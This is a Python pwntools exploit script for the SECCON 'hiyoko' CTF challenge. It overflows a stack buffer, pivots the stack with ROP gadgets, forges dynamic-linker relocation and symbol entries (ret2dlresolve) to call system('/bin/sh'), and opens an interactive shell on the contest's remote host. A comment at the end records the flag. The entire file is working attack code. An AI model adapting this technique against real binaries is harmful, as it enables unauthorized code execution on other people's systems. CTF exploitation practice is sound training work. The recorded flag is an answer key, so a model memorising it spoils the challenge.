from pwn import *



addr_pop_ebp = 0x080491ae  # : pop ebp ; ret
addr_pop = 0x08049022  # : pop ebx ; ret
addr_pop2 = 0x08049212  # : pop edi ; pop ebp ; ret
addr_pop3 = 0x08049211  # : pop esi ; pop edi ; pop ebp ; ret
addr_leave_ret = 0x080490e5  # : leave ; ret

addr_pivot = 0x0804c000 + 0x700


def get_section_addr(elf, name):
    return elf.get_section_by_name(name).header.sh_addr


def main():
    binpath = './chall'
    elf = ELF(binpath)

    context.binary = elf
    context.terminal = ['tmux', 'split-w', '-h']

    gdbscript = '''
    b *0x80491af
    gef
    '''
    # io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
    # io = process(binpath)
    io = remote('hiyoko.quals.seccon.jp', 9001)
    # io = remote('localhost', 9001)

    # print('Press enter to continue...')
    # input()

    # stage 1
    payload = b''
    payload += b'A' * 0x84
    payload += p32(0xdeadbeef)  # old ebp
    payload += p32(elf.plt['gets'])
    payload += p32(addr_pop)
    payload += p32(addr_pivot)
    payload += p32(addr_pop_ebp)
    payload += p32(addr_pivot)
    payload += p32(addr_leave_ret)
    io.sendline(payload)

    # input()

    addr_reloc = addr_pivot + 20
    addr_sym = addr_reloc + 8
    align_dynsym = 0x10 - ((addr_sym - get_section_addr(elf, '.dynsym')) & 0xf)
    addr_sym += align_dynsym
    addr_symstr = addr_sym + 16
    addr_cmd = addr_symstr + 7

    reloc_offset = addr_reloc - get_section_addr(elf, '.rel.plt')
    r_info = ((addr_sym - get_section_addr(elf, '.dynsym')) << 4) & ~0xff | 0x7
    st_name = addr_symstr -  get_section_addr(elf, '.dynstr')

    # stage 2
    payload = b''
    payload += p32(0xdeadbeef)
    payload += p32(get_section_addr(elf, '.plt'))
    payload += p32(reloc_offset)
    payload += p32(0xcafebabe)
    payload += p32(addr_cmd)
    payload += p32(elf.got['gets'])
    payload += p32(r_info)
    payload += b'C' * align_dynsym
    payload += p32(st_name)
    payload += p32(0)
    payload += p32(0)
    payload += p32(0x12)
    payload += b'system\x00'
    payload += b'/bin/sh\x00'
    io.sendline(payload)

    io.interactive()

    # SECCON{jUst_4_s1mpL3_b0f_ch4ll3ng3}


if __name__ == '__main__':
    main()
